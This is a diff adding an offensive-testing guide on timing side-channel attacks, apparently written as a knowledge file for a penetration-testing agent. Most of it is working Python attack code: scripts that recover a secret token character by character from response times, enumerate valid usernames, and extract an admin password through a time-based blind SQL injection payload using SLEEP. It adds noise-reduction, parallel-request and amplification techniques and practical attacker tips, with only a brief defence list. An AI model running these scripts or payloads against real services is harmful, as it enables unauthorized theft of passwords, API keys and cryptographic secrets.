@@ -1,0 +1,291 @@
+<vulnerability_guide>
+  <title>TIMING SIDE CHANNEL ATTACKS</title>
+
+  <critical>Timing side channels leak sensitive information through variations in execution time. Vulnerable string comparisons, cryptographic operations, and database queries can reveal secrets character by character. A few milliseconds difference can expose passwords, API keys, and cryptographic material.</critical>
+
+  <scope>
+    - String comparison timing attacks
+    - Cryptographic timing leaks
+    - Database query timing analysis
+    - Authentication oracle attacks
+    - Remote timing attacks
+    - Cache timing vulnerabilities
+  </scope>
+
+  <methodology>
+    1. TIMING VULNERABILITY DETECTION
+       {% raw %}
+       # Identify timing-sensitive operations
+
+       # Vulnerable patterns:
+       # - Non-constant-time string comparison
+       # - Early return on mismatch
+       # - Length-dependent operations
+       # - Database queries varying by input
+
+       # Quick test:
+       # Send requests with different inputs
+       # Measure response times
+       # Look for correlation with input characteristics
+
+       # Python timing measurement:
+       import time
+       times = []
+       for password in test_passwords:
+           start = time.perf_counter()
+           response = login(username, password)
+           elapsed = time.perf_counter() - start
+           times.append((password, elapsed))
+       {% endraw %}
+
+    2. STRING COMPARISON ATTACKS
+       {% raw %}
+       # Exploit non-constant-time comparison
+
+       # Vulnerable code:
+       if user_token == secret_token:
+           return authenticated
+       # First character wrong: fast
+       # All but last character right: slow
+
+       # Attack methodology:
+       # 1. Time baseline (all wrong)
+       # 2. Try each character in first position
+       # 3. Longest time = correct character
+       # 4. Fix first character, repeat for second
+       # 5. Continue until full secret recovered
+
+       import requests
+       import statistics
+
+       def time_request(token):
+           times = []
+           for _ in range(100):  # Multiple samples
+               start = time.perf_counter()
+               requests.get(url, headers={'Token': token})
+               times.append(time.perf_counter() - start)
+           return statistics.median(times)
+       {% endraw %}
+
+    3. CHARACTER ENUMERATION
+       {% raw %}
+       # Extract secret character by character
+
+       import string
+
+       known = ""
+       charset = string.ascii_lowercase + string.digits
+
+       while True:
+           best_time = 0
+           best_char = None
+
+           for c in charset:
+               test = known + c + 'X' * (target_length - len(known) - 1)
+               elapsed = time_request(test)
+
+               if elapsed > best_time:
+                   best_time = elapsed
+                   best_char = c
+
+           known += best_char
+           print(f"Current: {known}")
+
+           if len(known) >= target_length:
+               break
+
+       print(f"Secret: {known}")
+       {% endraw %}
+
+    4. AUTHENTICATION TIMING
+       {% raw %}
+       # User enumeration via timing
+
+       # Vulnerable scenario:
+       # Valid user: hash password, compare
+       # Invalid user: return immediately
+
+       # Attack:
+       for username in username_list:
+           time = measure_login(username, "wrongpassword")
+           if time > threshold:
+               print(f"Valid user: {username}")
+
+       # Password length detection:
+       # Some systems hash then compare
+       # Longer password = longer hash time
+       # Reveals password length
+       {% endraw %}
+
+    5. DATABASE TIMING ATTACKS
+       {% raw %}
+       # Timing differences in database queries
+
+       # Scenario: Search function
+       # More results = longer query time
+
+       # Boolean-based blind SQL injection variant:
+       # True condition: longer processing
+       # False condition: quick return
+
+       # Character extraction:
+       for position in range(1, secret_length + 1):
+           for c in charset:
+               payload = f"' AND (SELECT CASE WHEN SUBSTRING(password,{position},1)='{c}' THEN SLEEP(1) ELSE 1 END FROM users WHERE username='admin')--"
+               time = measure_request(payload)
+               if time > 1:
+                   print(f"Position {position}: {c}")
+                   break
+       {% endraw %}
+  </methodology>
+
+  <advanced_techniques>
+    <statistical_analysis>
+      {% raw %}
+      # Robust timing measurement
+
+      # Challenges:
+      # - Network jitter
+      # - Server load variation
+      # - Caching effects
+
+      # Solutions:
+      # - Multiple measurements per test
+      # - Statistical tests (t-test, Mann-Whitney)
+      # - Percentile-based comparison
+      # - Time-series analysis
+
+      from scipy import stats
+
+      def is_significantly_slower(times1, times2, p_threshold=0.05):
+          _, p_value = stats.mannwhitneyu(times1, times2, alternative='greater')
+          return p_value < p_threshold
+      {% endraw %}
+    </statistical_analysis>
+
+    <remote_timing>
+      {% raw %}
+      # Timing attacks over the network
+
+      # Challenges:
+      # - Network latency noise
+      # - Multi-hop routing
+      # - Load balancers
+
+      # Techniques:
+      # - High sample counts (1000s of requests)
+      # - Request bursting (send many quickly)
+      # - Clock synchronization
+      # - Concurrent timing
+
+      # TCP timestamp option:
+      # Use server's TCP timestamps
+      # More accurate than application-level timing
+
+      # Same-origin measurement:
+      # Execute from server in same datacenter
+      # Reduces network noise
+      {% endraw %}
+    </remote_timing>
+
+    <cryptographic_timing>
+      {% raw %}
+      # Attack cryptographic operations
+
+      # RSA timing attacks:
+      # Multiplication time varies with bits
+      # Reveals private key bits
+
+      # Padding oracle via timing:
+      # Invalid padding: quick error
+      # Valid padding: continue processing
+      # Even tiny timing difference exploitable
+
+      # HMAC timing:
+      # compare(compute_hmac(msg), provided_hmac)
+      # If compare is not constant-time: vulnerable
+
+      # AES cache timing:
+      # Table lookups depend on key bytes
+      # Cache hits/misses leak key material
+      {% endraw %}
+    </cryptographic_timing>
+
+    <parallel_timing>
+      {% raw %}
+      # Parallel requests for better measurement
+
+      # Send multiple requests simultaneously
+      # Compare relative ordering of responses
+
+      # Request 1: known baseline input
+      # Request 2: test input
+      # If test response arrives later: longer processing
+
+      import asyncio
+      import aiohttp
+
+      async def parallel_time(session, baseline, test):
+          baseline_task = asyncio.create_task(session.get(url, params=baseline))
+          test_task = asyncio.create_task(session.get(url, params=test))
+
+          # Which completes first?
+          done, pending = await asyncio.wait(
+              [baseline_task, test_task],
+              return_when=asyncio.FIRST_COMPLETED
+          )
+
+          return baseline_task in done  # True if baseline faster
+      {% endraw %}
+    </parallel_timing>
+
+    <amplification>
+      {% raw %}
+      # Amplify timing differences
+
+      # If natural difference is too small:
+      # Find operations that amplify
+
+      # Example: Repeated operations
+      # Vulnerable function called N times
+      # Timing difference * N
+
+      # Loop-based amplification:
+      payload = "A" * 10000  # Long input
+      # Processing time scales with length
+      # Timing difference more visible
+
+      # Nested operations:
+      # Trigger multiple vulnerable comparisons
+      {% endraw %}
+    </amplification>
+  </advanced_techniques>
+
+  <detection>
+    - Use constant-time comparison functions
+    - Implement rate limiting
+    - Add random delays to responses
+    - Monitor for systematic probing
+    - Audit cryptographic implementations
+  </detection>
+
+  <validation>
+    - Detect timing variation in target
+    - Successfully extract character-by-character
+    - Enumerate valid usernames
+    - Quantify timing differential
+    - Document statistical significance
+  </validation>
+
+  <pro_tips>
+    - Take many samples - 1000+ measurements reduce noise
+    - Test from same network segment if possible
+    - Early morning = less server load = cleaner signals
+    - Use TCP timestamps for microsecond precision
+    - Python hmac.compare_digest() is constant-time
+    - Java MessageDigest.isEqual() is constant-time
+    - String == comparison is almost never constant-time
+  </pro_tips>
+
+  <remember>Timing attacks exploit the difference between "quick failure" and "slow failure." Every early return, every short-circuit evaluation, every non-constant-time operation is a potential leak. The fix is simple in theory - make all operations take the same time regardless of input. In practice, finding and fixing all timing vulnerabilities is challenging.</remember>
+</vulnerability_guide>
